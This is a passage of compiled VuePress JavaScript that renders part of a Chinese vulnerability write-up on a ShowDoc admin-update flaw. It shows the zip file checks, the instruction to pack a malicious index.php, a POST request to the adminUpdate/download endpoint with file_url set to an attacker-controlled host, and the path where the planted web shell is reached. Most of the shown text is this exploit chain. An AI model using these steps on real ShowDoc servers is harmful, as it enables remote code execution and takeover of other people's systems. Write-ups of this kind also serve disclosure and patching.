zip文件，向后看看ZIP要求为需要存在部分文件")]),s._v(" "),n("div",{staticClass:"language-php line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-php"}},[n("code",[n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("if")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token function"}},[s._v("file_exists")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$zip_file_subpath")]),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v(".")]),n("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[s._v("'composer.json'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("&&")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token function"}},[s._v("file_exists")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$zip_file_subpath")]),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v(".")]),n("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[s._v("'web/index.php'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("&&")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token function"}},[s._v("file_exists")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$zip_file_subpath")]),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v(".")]),n("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[s._v("'server/vendor/autoload.php'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),s._v("\n")])]),s._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[s._v("1")]),n("br")])]),n("p",[s._v("制作ZIP包, index.php 为恶意文件")]),s._v(" "),n("p",[n("img",{attrs:{src:a(2004),alt:"img"}})]),s._v(" "),n("p",[s._v("发送请求包")]),s._v(" "),n("div",{staticClass:"language-php line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-php"}},[n("code",[n("span",{pre:!0,attrs:{class:"token constant"}},[s._v("POST")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("server"),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("index"),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v(".")]),s._v("php"),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("?")]),s._v("s"),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("api"),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("adminUpdate"),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("download\n  \nfile_url"),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("http"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),n("span",{pre:!0,attrs:{class:"token comment"}},[s._v("//xxx.xxx.xxx:8888/showdoc-2.zip&new_version=2")]),s._v("\n")])]),s._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[s._v("1")]),n("br"),n("span",{staticClass:"line-number"},[s._v("2")]),n("br"),n("span",{staticClass:"line-number"},[s._v("3")]),n("br")])]),n("p",[n("img",{attrs:{src:a(2005),alt:"img"}})]),s._v(" "),n("p",[s._v("访问上传的文件页面 "),n("code",[s._v("Public/Uploads/update/web/index.php")])])],1)}),[],!1,null,null,null);t.default=e.exports}}]);